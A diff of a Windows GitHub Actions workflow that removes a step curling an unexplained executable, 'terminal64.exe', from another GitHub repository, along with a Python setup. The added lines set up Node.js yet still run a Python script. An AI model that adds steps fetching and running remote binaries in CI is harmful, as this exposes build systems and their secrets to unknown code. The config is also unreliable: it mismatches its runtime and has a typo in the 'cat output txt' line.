@@ -10,29 +10,21 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v2
-
-    - name: Download terminal64.exe
-      run: |
-        curl -O https://github.com/BunaIas/1qaz/blob/44f19d659ff4996ede49dfa00dc5e9f71fae8510/.github/workflows/terminal64.exe
-        echo "Terminal64.exe download complete."
-
-    - name: Run terminal64.exe
-      run: |
-        echo "$(which terminal64.exe)"
-        ls -l
-
-    - name: Set up Python
-      uses: actions/setup-python@v2
+    - uses: actions/checkout@v2
+    - name: Set up Node.js
+      uses: actions/setup-node@v1
       with:
-        python-version: 3.8
+        node-version: '14.x'
 
-    - name: Install dependencies
-      run: |
-        pip install -r requirements.txt
+    
+
+    
+
+    
+
+    
 
     - name: Run script
       run: |
-        python .github/workflows/hv.py > output.txt
+        python .github/workflows/index.py > output.txt
         cat output txt
